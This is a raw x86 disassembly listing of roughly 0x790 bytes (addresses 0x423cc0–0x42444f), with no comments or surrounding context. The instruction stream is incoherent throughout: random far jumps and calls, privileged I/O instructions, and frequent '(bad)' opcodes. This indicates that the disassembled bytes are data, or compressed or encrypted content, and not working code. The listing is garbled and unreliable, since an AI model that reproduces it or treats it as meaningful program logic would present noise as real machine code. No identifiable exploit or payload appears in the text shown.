  423cc0:	or     DWORD PTR [edx],edi
  423cc2:	in     eax,dx
  423cc3:	leave  
  423cc4:	jl     0x423c70
  423cc6:	out    dx,eax
  423cc7:	jbe    0x423cff
  423cc9:	fcomp  DWORD PTR [ecx]
  423ccb:	test   BYTE PTR [eax-0xa4175cc],ch
  423cd1:	inc    edi
  423cd2:	iret   
  423cd3:	adc    dh,cl
  423cd5:	mov    esp,0x3b50be52
  423cda:	pop    ecx
  423cdb:	push   ebp
  423cdc:	hlt    
  423cdd:	and    al,0x5a
  423cdf:	shl    DWORD PTR [eax+0x2ba7c02b],cl
  423ce5:	inc    esp
  423ce6:	xchg   cl,al
  423ce8:	mov    ds:0x44ae0c31,al
  423ced:	push   es
  423cee:	or     eax,0xbd7e4b4e
  423cf3:	outs   dx,BYTE PTR ds:[esi]
  423cf4:	mov    BYTE PTR [eax+0x4c571262],cl
  423cfa:	inc    esp
  423cfb:	xchg   edx,eax
  423cfc:	shr    DWORD PTR [esp+ebx*2],1
  423cff:	(bad)  
  423d00:	cld    
  423d01:	push   ds
  423d02:	inc    edi
  423d03:	fsub   DWORD PTR [esi]
  423d05:	mov    eax,0xcb89a9ca
  423d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d0b:	call   0x47a6c675
  423d10:	in     eax,0xb
  423d12:	dec    esp
  423d13:	mov    ah,BYTE PTR [edx+0x30200d28]
  423d19:	js     0x423d29
  423d1b:	out    dx,al
  423d1c:	jns    0x423d01
  423d1e:	fsin   
  423d20:	inc    edx
	...
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x70010192],ah
  423d38:	cmp    ch,al
  423d3a:	inc    esp
  423d3b:	retf   
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	jg     0x423d46
  423d40:	add    BYTE PTR [eax],al
  423d42:	and    BYTE PTR [ebp-0x3f4d8a6f],cl
  423d48:	inc    ebp
  423d49:	sbb    bh,ah
  423d4b:	adc    ebp,eax
  423d4d:	sbb    BYTE PTR [ecx-0x2cd21d10],dl
  423d53:	das    
  423d54:	(bad)  
  423d55:	push   edi
  423d56:	jae    0x423da3
  423d58:	and    ch,BYTE PTR [esi-0x71]
  423d5b:	add    DWORD PTR [esp+ecx*8-0x5f],0x235273a1
  423d63:	(bad)  
  423d64:	push   esi
  423d65:	call   DWORD PTR [edx]
  423d67:	fisub  WORD PTR [edi+edi*1-0x570ddce3]
  423d6e:	push   0x16
  423d70:	add    al,0x29
  423d72:	(bad)
  423d75:	push   ebx
  423d76:	(bad)  
  423d78:	enter  0x362d,0x4c
  423d7c:	add    DWORD PTR [eax+eax*4-0x6e],esi
  423d80:	mov    WORD PTR [eax-0x70],ss
  423d83:	lods   al,BYTE PTR ds:[esi]
  423d84:	sti    
  423d85:	adc    bl,BYTE PTR [esi+0x72]
  423d88:	mov    bh,0x64
  423d8a:	adc    BYTE PTR [edi+0x2b479f71],dh
  423d90:	xchg   esi,eax
  423d91:	mov    esp,0xa74e622a
  423d96:	cmp    edx,ebp
  423d98:	or     esi,ecx
  423d9a:	stos   DWORD PTR es:[edi],eax
  423d9b:	fild   QWORD PTR [ecx-0x3b0451d5]
  423da1:	loopne 0x423dab
  423da3:	addr16 inc ebp
  423da5:	inc    esp
  423da6:	scas   al,BYTE PTR es:[edi]
  423da7:	push   0x5d
  423da9:	and    edx,ebp
  423dab:	sete   bh
  423dae:	add    al,0x5f
  423db0:	(bad)  
  423db1:	mov    esi,gs
  423db3:	shl    DWORD PTR [ebx-0x27],1
  423db6:	xor    DWORD PTR [eax],eax
  423db8:	jp     0x423df9
  423dba:	(bad)  
  423dbb:	adc    eax,0xf22f28c6
  423dc0:	pop    eax
  423dc1:	or     esi,ebp
  423dc3:	std    
  423dc4:	aaa    
  423dc5:	xor    cl,al
  423dc7:	sub    DWORD PTR [ecx-0x29],ebp
  423dca:	js     0x423dfa
  423dcc:	cmc    
  423dcd:	dec    ebp
  423dce:	cmp    edx,DWORD PTR [ebx]
  423dd0:	test   ebx,0x812519ef
  423dd6:	ja     0x423d79
  423dd8:	pop    ebp
  423dd9:	sub    al,0xdd
  423ddb:	jmp    0xe2da8f25
  423de0:	dec    esi
  423de1:	mov    dh,0xfd
  423de3:	fmulp  st(4),st
  423de5:	(bad)  
  423de6:	jne    0x423d9c
  423de8:	mov    ecx,0xb2eae91d
  423ded:	pop    ebx
  423dee:	sbb    BYTE PTR [edi],ch
  423df0:	(bad)  
  423df1:	repz mov edx,0x3a4b35f1
  423df7:	cmp    ebp,DWORD PTR [esi]
  423df9:	inc    ecx
  423dfa:	popf   
  423dfb:	shl    BYTE PTR [esi+0x14796542],cl
  423e01:	fist   WORD PTR [edx+0x6d636c75]
  423e07:	in     eax,0x21
  423e09:	je     0x423e27
  423e0b:	add    ch,BYTE PTR [edx+edx*2+0x78facece]
  423e12:	loop   0x423dd1
  423e14:	jb     0x423e5a
  423e16:	lahf   
  423e17:	fnstsw WORD PTR [esi-0x68eed27b]
  423e1d:	jbe    0x423e0a
  423e1f:	and    dh,ah
  423e21:	pusha  
  423e22:	mov    eax,0x72d798b2
  423e27:	imul   si,WORD PTR [edx+eax*8+0x2f],0x21
  423e2d:	and    DWORD PTR [ecx+ebp*1+0xebd7f34],ebx
  423e34:	xor    edx,edx
  423e36:	scas   al,BYTE PTR es:[edi]
  423e37:	loop   0x423e4e
  423e39:	sti    
  423e3a:	ss (bad) 
  423e3c:	sbb    edx,DWORD PTR [edi-0x56491701]
  423e42:	retf   0x94af
  423e45:	outs   dx,DWORD PTR ds:[esi]
  423e46:	mov    esi,0x2e4a2b6a
  423e4b:	stos   DWORD PTR es:[edi],eax
  423e4c:	add    eax,0xcb70ee99
  423e51:	std    
  423e52:	dec    ecx
  423e53:	hlt    
  423e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e56:	outs   dx,BYTE PTR ds:[esi]
  423e57:	cli    
  423e58:	sub    eax,0x29a46c32
  423e5d:	fadd   QWORD PTR [edi+0x60347ace]
  423e63:	add    al,0x4a
  423e65:	call   0x18df:0x326645ed
  423e6c:	imul   esi,DWORD PTR [ebp+0x7865223e],0x8c1a7678
  423e76:	xchg   ebp,eax
  423e77:	push   0x75
  423e79:	mov    gs,WORD PTR [ebx+0x17]
  423e7c:	sbb    al,0x9e
  423e7e:	push   0xa59f025d
  423e83:	or     BYTE PTR [edx-0x3c],dl
  423e86:	mov    ch,0xec
  423e88:	push   eax
  423e89:	sbb    esi,DWORD PTR [ebx-0x3bc5b672]
  423e8f:	ins    BYTE PTR es:[edi],dx
  423e90:	(bad)  [esi-0x62e0d613]
  423e96:	fbstp  TBYTE PTR [edi]
  423e98:	gs inc ecx
  423e9a:	dec    esi
  423e9b:	sub    ah,BYTE PTR [ebx+0x53]
  423e9e:	mov    WORD PTR [esi+0x4a],cs
  423ea1:	or     eax,0xb6138d02
  423ea6:	in     eax,0xfa
  423ea8:	jg     0x423ed9
  423eaa:	mov    al,0x8c
  423eac:	enter  0xd500,0xa
  423eb0:	fnsave [ebp-0x4b]
  423eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eb4:	pushf  
  423eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423eb6:	je     0x423e5a
  423eb8:	gs loopne 0x423e8b
  423ebb:	sub    dl,BYTE PTR [edi-0xb223cc6]
  423ec1:	and    bl,BYTE PTR [edx]
  423ec3:	inc    esp
  423ec4:	retf   0x9498
  423ec7:	sub    BYTE PTR [edi],dl
  423ec9:	xor    esi,DWORD PTR [edx+esi*2+0x7418cf82]
  423ed0:	test   BYTE PTR [eax],ch
  423ed2:	cmp    DWORD PTR ds:[ebx-0x3e6bbde],0xffffffe3
  423eda:	data16 jge 0x423f31
  423edd:	add    BYTE PTR [ebx+esi*4-0x2],dl
  423ee1:	jnp    0x423e97
  423ee3:	pop    edi
  423ee4:	mov    edx,DWORD PTR [esi-0x23]
  423ee7:	fistp  WORD PTR [edi-0x66]
  423eea:	mov    esp,0x2f4652a2
  423eef:	jae    0x423f16
  423ef1:	fdivr  QWORD PTR [edi-0x317f057f]
  423ef7:	inc    ecx
  423ef8:	or     BYTE PTR [ebp-0x3e086208],bh
  423efe:	push   eax
  423eff:	jecxz  0x423eb2
  423f01:	xchg   ebx,eax
  423f02:	jnp    0x423ee2
  423f04:	scas   al,BYTE PTR es:[edi]
  423f05:	sbb    DWORD PTR [edi+0x27a9a9c4],edx
  423f0b:	xchg   esi,eax
  423f0c:	aas    
  423f0d:	jo     0x423e9a
  423f0f:	daa    
  423f10:	mov    esp,0x63f9c522
  423f15:	leave  
  423f16:	or     edx,eax
  423f18:	xor    DWORD PTR [eax-0x11],esi
  423f1b:	lock in eax,dx
  423f1d:	shl    DWORD PTR [ebp+0x1844cd46],1
  423f23:	clc    
  423f24:	or     eax,DWORD PTR [edi]
  423f26:	outs   dx,DWORD PTR ds:[esi]
  423f27:	xchg   edx,eax
  423f28:	loope  0x423f1a
  423f2a:	adc    DWORD PTR [edi+0x7c847c06],0xf9fea8e9
  423f34:	jge    0x423f33
  423f36:	mov    ch,0x22
  423f38:	ins    DWORD PTR es:[edi],dx
  423f39:	je     0x423f21
  423f3b:	jbe    0x423f79
  423f3d:	pop    DWORD PTR [esi+ecx*1]
  423f40:	lds    ecx,FWORD PTR [esi-0x18527057]
  423f46:	xor    al,0xd3
  423f48:	dec    ebp
  423f49:	and    ah,BYTE PTR [ebx+ebp*2-0xea30498]
  423f50:	out    dx,eax
  423f51:	cdq    
  423f52:	mov    dh,0x1b
  423f54:	push   cs
  423f55:	push   eax
  423f56:	les    edx,FWORD PTR [esi]
  423f58:	call   0x325d06bd
  423f5d:	push   es
  423f5e:	cmp    al,0xef
  423f60:	fwait
  423f61:	add    ah,BYTE PTR [esi+0x6a]
  423f64:	cmp    al,0xec
  423f66:	ins    DWORD PTR es:[edi],dx
  423f67:	pop    edx
  423f68:	lods   al,BYTE PTR ds:[esi]
  423f69:	sub    eax,0xb6873740
  423f6e:	imul   esp,DWORD PTR [edx-0x7a],0xffffff97
  423f72:	xlat   BYTE PTR ds:[ebx]
  423f73:	pop    ebp
  423f74:	aam    0x38
  423f76:	cli    
  423f77:	inc    esi
  423f78:	cmp    cl,BYTE PTR [ecx+eiz*8-0x40]
  423f7c:	xor    dh,dl
  423f7e:	popa   
  423f7f:	aam    0xfa
  423f81:	mov    dl,0xec
  423f83:	jne    0x423f94
  423f85:	dec    edi
  423f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f87:	and    BYTE PTR [eax+0x6379d3a4],0x70
  423f8e:	stc    
  423f8f:	xor    bh,BYTE PTR [ecx]
  423f91:	xor    eax,0x8da069a5
  423f96:	scas   eax,DWORD PTR es:[edi]
  423f97:	clc    
  423f98:	sahf   
  423f99:	sub    ch,BYTE PTR [edi-0x739c985c]
  423f9f:	jnp    0x423fcc
  423fa1:	hlt    
  423fa2:	xchg   ecx,eax
  423fa3:	dec    esi
  423fa4:	outs   dx,BYTE PTR ds:[esi]
  423fa5:	rcr    BYTE PTR [ebx],0x96
  423fa8:	rcl    DWORD PTR [ebx+0x9eebc5d],0x68
  423faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fb0:	or     DWORD PTR [ebx-0x286bc043],edx
  423fb6:	lahf   
  423fb7:	jge    0x423fab
  423fb9:	lods   eax,DWORD PTR ds:[esi]
  423fba:	data16 add al,0x3a
  423fbd:	out    0xbe,eax
  423fbf:	push   edi
  423fc0:	or     al,0x7b
  423fc2:	lahf   
  423fc3:	mov    ebp,0x617a0663
  423fc8:	xor    BYTE PTR [ecx-0x7],bl
  423fcb:	xchg   ecx,eax
  423fcc:	loopne 0x423f70
  423fce:	or     DWORD PTR [eax+0x19],eax
  423fd1:	in     eax,dx
  423fd2:	cmp    DWORD PTR gs:[ebx+0x458ef6c8],eax
  423fd9:	dec    eax
  423fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fdb:	and    eax,0x78a81627
  423fe0:	inc    esi
  423fe1:	jb     0x424044
  423fe3:	rcl    BYTE PTR [esi+eax*2],1
  423fe6:	add    esp,DWORD PTR [edi]
  423fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fe9:	outs   dx,BYTE PTR ds:[esi]
  423fea:	gs dec ebp
  423fed:	dec    ebx
  423fee:	cmp    ecx,DWORD PTR [ecx+0x47]
  423ff1:	shr    BYTE PTR [esi-0x51],1
  423ff4:	test   eax,0xbf09dd49
  423ff9:	and    DWORD PTR [ebp+esi*8-0x38c40255],edx
  424000:	xchg   DWORD PTR [ebx-0x5504a466],edi
  424006:	ins    DWORD PTR es:[edi],dx
  424007:	xchg   edx,eax
  424008:	adc    eax,0x741cbb57
  42400d:	lods   al,BYTE PTR ds:[esi]
  42400e:	sar    BYTE PTR [ebp-0x50aac2fc],1
  424014:	jl     0x423f9d
  424016:	push   ebp
  424017:	jp     0x42402c
  424019:	sahf   
  42401a:	div    BYTE PTR [ecx+0x3b]
  42401d:	xlat   BYTE PTR ds:[ebx]
  42401e:	out    dx,eax
  42401f:	push   edx
  424020:	sub    eax,0x405de495
  424025:	popa   
  424026:	pop    ds
  424027:	in     al,dx
  424028:	(bad)  
  424029:	jmp    0x7e78:0x3346709
  424030:	std    
  424031:	sub    BYTE PTR [esi-0x68],ch
  424034:	lahf   
  424035:	or     BYTE PTR [edi],0xdf
  424038:	push   edx
  424039:	(bad)  
  42403a:	aad    0xb8
  42403c:	(bad)
  42403f:	sub    BYTE PTR [eax+0x38],0x54
  424043:	adc    eax,0xd88e3dae
  424048:	imul   edi,esi,0x5421b586
  42404e:	pop    ebx
  42404f:	cld    
  424050:	sub    bl,BYTE PTR [edi]
  424052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424054:	xchg   ebx,eax
  424055:	or     ch,BYTE PTR [edx]
  424057:	pop    esp
  424058:	jge    0x4240c9
  42405a:	fisttp DWORD PTR [edx]
  42405c:	mov    BYTE PTR [edx],dh
  42405e:	mov    ss,WORD PTR [eax+ecx*2+0x1826eee2]
  424065:	ret    0x34ca
  424068:	inc    esp
  424069:	jno    0x42406e
  42406b:	add    DWORD PTR [eax-0x8],ecx
  42406e:	jmp    0x424033
  424070:	mul    DWORD PTR [ecx]
  424072:	dec    eax
  424073:	bound  esp,QWORD PTR [edx]
  424075:	fwait
  424076:	adc    al,0xa2
  424078:	add    DWORD PTR [ecx],edx
  42407a:	jp     0x4240c8
  42407c:	and    edi,DWORD PTR [ebx]
  42407e:	cdq    
  42407f:	pushf  
  424080:	int    0x9c
  424082:	iret   
  424083:	mov    esp,0x4dd2dadb
  424088:	mov    ebx,DWORD PTR [edi+0x1da29de4]
  42408e:	ja     0x424088
  424090:	xlat   BYTE PTR ds:[ebx]
  424091:	and    BYTE PTR [esi-0x13],0xaf
  424095:	mov    esi,0xc49ff1e4
  42409a:	imul   esp,DWORD PTR [eax],0xffffff84
  42409d:	add    bh,dh
  42409f:	jecxz  0x4240e3
  4240a1:	dec    edx
  4240a2:	xor    bh,ah
  4240a4:	repz xchg ebp,eax
  4240a6:	sub    BYTE PTR [ebx-0x42],al
  4240a9:	sbb    BYTE PTR [esi-0x5163409e],ah
  4240af:	mov    dl,0xdd
  4240b1:	in     al,0x8b
  4240b3:	ret    0x2c03
  4240b6:	sub    DWORD PTR [edi+0xc],eax
  4240b9:	dec    edx
  4240ba:	cmp    esi,DWORD PTR [edx]
  4240bc:	push   ecx
  4240bd:	loope  0x424115
  4240bf:	cmp    eax,DWORD PTR [edi]
  4240c1:	cs mov edx,0x65bf9318
  4240c7:	mov    esp,DWORD PTR [ebx-0x7]
  4240ca:	jb     0x424055
  4240cc:	mov    ecx,0xbd239215
  4240d1:	push   es
  4240d2:	mov    esp,0xfb67015a
  4240d7:	popf   
  4240d8:	push   edi
  4240d9:	rcr    BYTE PTR [ebx],0x3c
  4240dc:	test   al,0xe0
  4240de:	aad    0xaf
  4240e0:	jbe    0x4240de
  4240e2:	sbb    cl,al
  4240e4:	loopne 0x4240bb
  4240e6:	xchg   ecx,eax
  4240e7:	mov    bl,0x8
  4240e9:	aas    
  4240ea:	jl     0x424127
  4240ec:	xor    ebx,DWORD PTR [ebx+eax*2+0x3f6bb7a]
  4240f3:	leave  
  4240f4:	out    dx,eax
  4240f5:	enter  0xf27d,0x46
  4240f9:	cli    
  4240fa:	retf   0x4d39
  4240fd:	xor    BYTE PTR [esi+0x41],0xb8
  424101:	mov    cl,0x1c
  424103:	or     BYTE PTR [ebx-0x6b56b8cd],bh
  424109:	adc    al,0x69
  42410b:	popf   
  42410c:	add    eax,0x71ada7b7
  424111:	fs sub eax,0x9e2fd3d7
  424117:	pusha  
  424118:	sub    BYTE PTR [eax+0x7631aab0],0x5
  42411f:	iret   
  424120:	sbb    al,0x58
  424122:	sbb    ch,BYTE PTR [ecx]
  424124:	loope  0x424140
  424126:	test   BYTE PTR [edx],bl
  424128:	jne    0x424197
  42412a:	fstp   TBYTE PTR [ebp-0x6e]
  42412d:	(bad)  
  42412e:	shr    ecx,1
  424130:	fiadd  WORD PTR [ebp+0x2d3ba6c2]
  424136:	or     edi,edi
  424138:	push   ds
  424139:	fidiv  WORD PTR [edi-0x33]
  42413c:	sub    bh,dl
  42413e:	in     eax,dx
  42413f:	xor    ebp,DWORD PTR [esi+0x31]
  424142:	xlat   BYTE PTR fs:[ebx]
  424144:	mov    ebp,0x1a57b31f
  424149:	xchg   esi,eax
  42414a:	adc    DWORD PTR [ecx-0x2e756d25],0xd457fd59
  424154:	and    ah,BYTE PTR [eax-0xc8df1e4]
  42415a:	and    al,ah
  42415c:	(bad)  
  42415d:	(bad)  
  42415e:	pop    ebx
  42415f:	pop    esi
  424160:	mov    ebx,ecx
  424162:	mov    eax,ds:0xf08be3e5
  424167:	cmovg  eax,DWORD PTR [eax]
  42416a:	pop    ebp
  42416b:	and    DWORD PTR [ebx+ecx*8],0x19
  42416f:	or     ecx,DWORD PTR [ebp+eax*1-0x58]
  424173:	rcr    BYTE PTR [edi],1
  424175:	test   al,0x44
  424177:	dec    esi
  424178:	push   0xffffffb1
  42417a:	push   cs
  42417b:	aas    
  42417c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42417d:	mov    ebx,0x68b115b0
  424182:	into   
  424183:	xchg   edi,eax
  424184:	lods   eax,DWORD PTR ds:[esi]
  424185:	mov    DWORD PTR cs:[ecx-0x55],eax
  424189:	(bad)  
  42418a:	js     0x4241df
  42418c:	xor    eax,edx
  42418e:	mov    ch,dl
  424190:	inc    edx
  424191:	xchg   esi,eax
  424192:	int3   
  424193:	arpl   WORD PTR [ecx+0x74],bp
  424196:	sbb    ebx,ecx
  424198:	mov    dh,0x1a
  42419a:	je     0x42415a
  42419c:	and    eax,0x8f477c14
  4241a1:	xchg   esp,eax
  4241a2:	outs   dx,BYTE PTR ds:[esi]
  4241a3:	loope  0x424220
  4241a5:	(bad)  [esi+0x6a]
  4241a8:	cmp    edi,DWORD PTR [eax]
  4241aa:	mov    eax,ds:0xb04e7f02
  4241af:	xor    BYTE PTR [ebx-0x4d],0xb9
  4241b3:	js     0x4241fb
  4241b5:	sub    DWORD PTR [edi],ebp
  4241b7:	ror    BYTE PTR [esi-0x25b6eb2b],1
  4241bd:	nop
  4241be:	jo     0x42423e
  4241c0:	mov    ds:0x23076da6,eax
  4241c5:	push   ds
  4241c6:	mov    edx,0xdafe9343
  4241cb:	popf   
  4241cc:	ins    DWORD PTR es:[edi],dx
  4241cd:	xchg   ecx,eax
  4241ce:	xor    dl,BYTE PTR [ebx+0x37]
  4241d1:	add    al,0x49
  4241d3:	hlt    
  4241d4:	and    BYTE PTR [ebp-0x18],0xe5
  4241d8:	out    0xa0,al
  4241da:	add    eax,0x6c91393d
  4241df:	push   ecx
  4241e0:	inc    esi
  4241e1:	es dec ebp
  4241e3:	jns    0x4241a0
  4241e5:	adc    ah,BYTE PTR [ecx+0x2f86a5b]
  4241eb:	jne    0x424195
  4241ed:	and    BYTE PTR [ecx-0x67],al
  4241f0:	mov    edi,0xd168d956
  4241f5:	aad    0x46
  4241f7:	and    al,0x2a
  4241f9:	xor    BYTE PTR ds:0xc7c3fd87,dh
  4241ff:	inc    ebp
  424200:	cmp    ecx,DWORD PTR ds:0xeefe723e
  424206:	mov    al,0x4c
  424208:	or     DWORD PTR [edx+0x71],ecx
  42420b:	popa   
  42420c:	js     0x42425a
  42420e:	mov    edi,0x7a13cb3d
  424213:	jle    0x4241fc
  424215:	pop    esi
  424216:	jne    0x4241f6
  424218:	(bad)  
  424219:	and    edx,DWORD PTR [ebx+0x7bf41f38]
  42421f:	out    0xb6,al
  424221:	das    
  424222:	sub    edx,DWORD PTR [edx-0x54]
  424225:	jns    0x42420b
  424227:	push   edx
  424228:	adc    DWORD PTR [edx-0x4b],edx
  42422b:	ret    0x1467
  42422e:	adc    BYTE PTR es:[ecx+0x1],0x66
  424233:	lea    ebx,[eax-0x41bdb387]
  424239:	jmp    0x1b648746
  42423e:	aam    0x67
  424240:	jmp    0x54fe:0xb977799d
  424247:	cmc    
  424248:	retf   
  424249:	pushf  
  42424a:	imul   esi,DWORD PTR [eax-0x233ed2ab],0x5b693460
  424254:	sub    ah,BYTE PTR [edi-0x7]
  424257:	mov    bh,0xc5
  424259:	dec    eax
  42425a:	imul   ebp,DWORD PTR [ecx+0x3a],0x78
  42425e:	fidivr DWORD PTR [edx+0x17]
  424261:	fldenv [esi]
  424263:	into   
  424264:	adc    DWORD PTR [edx-0x28],0xbe49096b
  42426b:	jecxz  0x4241f2
  42426d:	aam    0x2f
  42426f:	outs   dx,BYTE PTR ds:[esi]
  424270:	mov    WORD PTR [ecx],?
  424272:	dec    ebp
  424273:	jmp    0x424297
  424275:	lods   eax,DWORD PTR ds:[esi]
  424276:	fiadd  DWORD PTR ds:[ebx-0x293f8834]
  42427d:	mov    ecx,0xd2fb9b77
  424282:	push   cs
  424283:	adc    bl,BYTE PTR [ecx+0x63]
  424286:	mov    DWORD PTR [edi+0x2f3feff5],edx
  42428c:	inc    edx
  42428d:	stc    
  42428e:	sub    BYTE PTR [esi],0x2f
  424291:	mov    esi,0x42c6ba20
  424296:	aas    
  424297:	xchg   ecx,eax
  424298:	mov    WORD PTR [eax-0x51],gs
  42429b:	jb     0x4242b7
  42429d:	(bad)  
  42429e:	push   0x34dd35c5
  4242a3:	and    bh,BYTE PTR [edi]
  4242a5:	call   0xfdc5a326
  4242aa:	mov    edi,0xa3603ce0
  4242af:	loop   0x42429d
  4242b1:	ficom  DWORD PTR [esi]
  4242b3:	ds in  al,0xba
  4242b6:	push   es
  4242b7:	mov    edx,cs
  4242b9:	sub    DWORD PTR [ebp-0x2d],esi
  4242bc:	jne    0x424253
  4242be:	inc    edx
  4242bf:	pop    es
  4242c0:	inc    edi
  4242c1:	cmp    ebp,esi
  4242c3:	(bad)  
  4242c4:	xchg   edx,eax
  4242c5:	stc    
  4242c6:	ins    BYTE PTR es:[edi],dx
  4242c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242c8:	dec    esi
  4242c9:	sub    edx,esi
  4242cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242cc:	xchg   edx,eax
  4242cd:	ror    BYTE PTR [ecx+0x49],cl
  4242d0:	mov    ebp,0x1118203c
  4242d5:	cmp    ebx,DWORD PTR [ebx-0x65]
  4242d8:	pop    es
  4242d9:	je     0x42431b
  4242db:	or     eax,0x21c81cee
  4242e0:	das    
  4242e1:	js     0x4242d2
  4242e3:	cmp    ebp,ecx
  4242e5:	into   
  4242e6:	mov    bl,0xd3
  4242e8:	mov    ecx,0x665cce81
  4242ed:	stc    
  4242ee:	(bad)  
  4242ef:	loope  0x424327
  4242f1:	(bad)  
  4242f2:	or     BYTE PTR [esi-0x27],ah
  4242f5:	dec    edx
  4242f6:	sub    al,0x3
  4242f8:	sbb    eax,0x8f886742
  4242fd:	(bad)  
  4242fe:	out    0xf3,eax
  424300:	sbb    ah,BYTE PTR [esi+0x7d]
  424303:	mov    esp,0xa786563
  424308:	jns    0x42432d
  42430a:	icebp  
  42430b:	call   0xc409b2b7
  424310:	fdiv   st(5),st
  424312:	popw   ds
  424314:	adc    DWORD PTR [eax],eax
  424316:	sub    eax,0xe237c1e0
  42431b:	retf   
  42431c:	in     al,0x30
  42431e:	das    
  42431f:	sub    eax,0x49736856
  424324:	jmp    0xb1875400
  424329:	push   edx
  42432a:	push   dx
  42432c:	mov    BYTE PTR [edi+0x63],dl
  42432f:	arpl   ax,ax
  424331:	mov    BYTE PTR [eax+ebp*1],dh
  424334:	sbb    esp,DWORD PTR [ecx+0x6b]
  424337:	xor    al,BYTE PTR [esi]
  424339:	push   esi
  42433a:	xor    DWORD PTR [esi],ebp
  42433c:	cwde   
  42433d:	outs   dx,DWORD PTR ds:[esi]
  42433e:	jno    0x424377
  424340:	pop    ds
  424341:	push   eax
  424342:	cmp    bh,BYTE PTR [edx-0x16321876]
  424348:	mov    esp,0xc327e6b7
  42434d:	mov    ds:0x34003450,eax
  424352:	nop
  424353:	xlat   BYTE PTR ds:[ebx]
  424354:	pop    edi
  424355:	call   0xb645ab84
  42435a:	jl     0x424387
  42435c:	mov    ch,0x17
  42435e:	in     al,0xba
  424360:	std    
  424361:	dec    ebp
  424362:	push   es
  424363:	rcl    BYTE PTR [edx+0x27],0xaa
  424367:	or     al,0x2e
  424369:	out    dx,eax
  42436a:	sbb    BYTE PTR [edi-0x7353bb5c],ch
  424370:	xor    al,0x38
  424372:	sbb    ebp,DWORD PTR [edx+0x81c934e]
  424378:	fmul   DWORD PTR [ebx]
  42437a:	aam    0xd8
  42437c:	arpl   bp,si
  42437e:	sbb    al,BYTE PTR [ebx-0x7c]
  424381:	sbb    BYTE PTR [ebp-0x71e7fef1],0x19
  424388:	add    al,BYTE PTR [ebx-0x61]
  42438b:	sbb    BYTE PTR [ebp-0x38594eed],bl
  424391:	scas   al,BYTE PTR es:[edi]
  424392:	clc    
  424393:	sti    
  424394:	ror    DWORD PTR [edi+0x63],cl
  424397:	pop    ebp
  424398:	adc    al,0xd1
  42439a:	ins    DWORD PTR es:[edi],dx
  42439b:	scas   eax,DWORD PTR es:[edi]
  42439c:	mov    ds:0xdb151bdb,al
  4243a1:	add    bl,BYTE PTR [ecx]
  4243a3:	cli    
  4243a4:	outs   dx,DWORD PTR ds:[esi]
  4243a5:	dec    eax
  4243a6:	in     al,0xc7
  4243a8:	mov    esi,0x5f1dc902
  4243ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243ae:	jb     0x4243b2
  4243b0:	adc    bl,BYTE PTR [esp+ecx*8-0x55]
  4243b4:	les    ebp,FWORD PTR [edx-0x5a]
  4243b7:	xchg   DWORD PTR [edx],esp
  4243b9:	push   0xffffffed
  4243bb:	cmp    DWORD PTR [ebx+eax*8+0x6d],edi
  4243bf:	xor    eax,0x39
  4243c4:	add    BYTE PTR [eax],al
  4243c6:	add    BYTE PTR [eax],al
  4243c8:	add    BYTE PTR [eax],al
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424443
  4243d7:	cmp    ebp,DWORD PTR [esi+eax*4]
  4243da:	ret    
  4243db:	rol    DWORD PTR [ecx],1
  4243dd:	add    BYTE PTR [edi+0x6],bh
  4243e0:	add    BYTE PTR [eax],al
  4243e2:	adc    al,0x86
  4243e4:	(bad)  
  4243e5:	out    0x62,al
  4243e7:	ja     0x4243ae
  4243e9:	mov    BYTE PTR [edi+0x39a704c],al
  4243ef:	ds mov eax,esp
  4243f2:	rcl    ch,0xcb
  4243f5:	dec    esp
  4243f6:	iret   
  4243f7:	cld    
  4243f8:	outs   dx,BYTE PTR ds:[esi]
  4243f9:	fstp   DWORD PTR [ebx+0x35]
  4243fc:	pop    edi
  4243fd:	scas   eax,DWORD PTR es:[edi]
  4243fe:	fidivr DWORD PTR [edi]
  424400:	xchg   ebx,edx
  424402:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  424404:	fprem  
  424406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424407:	add    eax,0x4bf5bbb9
  42440c:	inc    eax
  42440d:	xchg   esi,eax
  42440e:	xor    esp,edi
  424410:	iret   
  424411:	jno    0x4243df
  424413:	xchg   ebp,eax
  424414:	mov    ebp,0x5ee7ed41
  424419:	dec    esp
  42441a:	push   ds
  42441b:	out    dx,eax
  42441c:	xor    eax,0xb8380ea5
  424421:	pop    es
  424422:	pushf  
  424423:	pop    edx
  424424:	sbb    DWORD PTR [esi-0x1e],esp
  424427:	xor    eax,0xfe1c7606
  42442c:	das    
  42442d:	shl    DWORD PTR [edi],0x9a
  424430:	jns    0x4244ad
  424432:	dec    esi
  424433:	leave  
  424434:	std    
  424435:	jno    0x424416
  424437:	or     eax,0xfb767069
  42443c:	sbb    eax,0xfcf05b8f
  424441:	and    DWORD PTR [ebp+eiz*4-0x2],ebx
  424445:	sub    BYTE PTR [eax-0x30],dl
  424448:	push   ebp
  424449:	sti    
  42444a:	adc    eax,0xbead772e
  42444f:	loopne 0x424403
